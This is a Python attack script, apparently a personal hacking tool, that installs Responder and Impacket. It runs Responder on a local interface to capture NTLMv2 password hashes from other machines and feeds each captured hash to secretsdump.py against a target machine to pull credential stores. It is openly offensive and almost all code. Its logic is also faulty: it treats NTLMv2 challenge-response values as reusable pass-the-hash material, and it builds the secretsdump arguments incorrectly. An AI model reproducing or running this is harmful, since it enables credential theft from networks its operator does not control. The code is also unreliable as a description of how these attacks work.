######################################################################################################################################################################################################################
# Python script that installs required tools, attempts to hijack password hashes off the network, correctly format the hashes gleened, then passes the hashes to target machine stipulated. 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################



import subprocess
import re
import sys
import os

def display_splash_screen():
    splash = """
    
    
_________                __                                            .___ ________________________ ___   ___________           .__                 _____ ______________  ___ ___    _____           _______  ____ 
\_   ___ \_____  _______/  |_ __ _________   ____   _____    ____    __| _/ \______   \__    ___/   |   \  \__    ___/___   ____ |  |               /  |  /_   \______   \/   |   \  /  |  |          \   _  \/_   |
/    \  \/\__  \ \____ \   __\  |  \_  __ \_/ __ \  \__  \  /    \  / __ |   |     ___/ |    | /    ~    \   |    | /  _ \ /  _ \|  |     ______   /   |  ||   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
\     \____/ __ \|  |_> >  | |  |  /|  | \/\  ___/   / __ \|   |  \/ /_/ |   |    |     |    | \    Y    /   |    |(  <_> |  <_> )  |__  /_____/  /    ^   /   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
 \______  (____  /   __/|__| |____/ |__|    \___  > (____  /___|  /\____ |   |____|     |____|  \___|_  /    |____| \____/ \____/|____/           \____   ||___||____|    \___|_  /\____   |           \_____  /___|
        \/     \/|__|                           \/       \/     \/      \/                            \/                                               |__|                     \/      |__|                 \/     
 
                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)
   
 
"""

    print(splash)
    print("Capture & PTH Tool 41PH4-01\n")

def install_responder():
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "git+https://github.com/lgandx/Responder.git"])
        print("[+] Responder installed successfully.")
    except subprocess.CalledProcessError:
        print("[-] Failed to install Responder.")
        sys.exit(1)

def install_impacket():
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "impacket"])
        print("[+] Impacket installed successfully.")
    except subprocess.CalledProcessError:
        print("[-] Failed to install Impacket.")
        sys.exit(1)

def capture_hashes():
    print("[+] Starting Responder to capture hashes...")
    responder_process = subprocess.Popen(['sudo', 'responder', '-I', 'eth0'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return responder_process

def stop_responder(responder_process):
    print("[+] Stopping Responder...")
    responder_process.terminate()

def extract_hashes():
    print("[+] Extracting captured hashes from Responder logs...")
    hashes = []
    responder_log_path = '/usr/share/responder/logs/Responder-Session.log'
    if not os.path.exists(responder_log_path):
        print("[-] Responder log file not found.")
        return hashes

    with open(responder_log_path, 'r') as log_file:
        for line in log_file:
            if 'NTLMv2-SSP Hash' in line:
                hash_line = line.strip()
                ntlm_hash = re.search(r'(?<=NTLMv2-SSP Hash   : )(.*)', hash_line).group(0)
                hashes.append(ntlm_hash)
    return hashes

def run_secretsdump(target, ntlm_hash):
    command = [
        "secretsdump.py",
        f"-hashes {ntlm_hash}",
        f"TARGET/{target}"
    ]
    result = subprocess.run(command, capture_output=True, text=True)
    return result.stdout

def main():
    # Install Responder
    install_responder()

    # Install Impacket
    install_impacket()

    # Start Responder to capture hashes
    responder_process = capture_hashes()

    # Let Responder run for a period to capture hashes
    try:
        input("Press Enter to stop Responder and process captured hashes...")
    except KeyboardInterrupt:
        pass

    # Stop Responder
    stop_responder(responder_process)

    # Extract captured hashes
    hashes = extract_hashes()
    if not hashes:
        print("[-] No hashes captured. Exiting.")
        return

    # Run secretsdump using captured hashes
    target = "TARGET_MACHINE_NAME"
    for ntlm_hash in hashes:
        print(f"[+] Using hash: {ntlm_hash}")
        output = run_secretsdump(target, ntlm_hash)
        if output:
            print("[+] Extracted NTLM Hashes:")
            print(output)
        else:
            print("[-] Failed to extract NTLM Hashes")

if __name__ == "__main__":
    main()
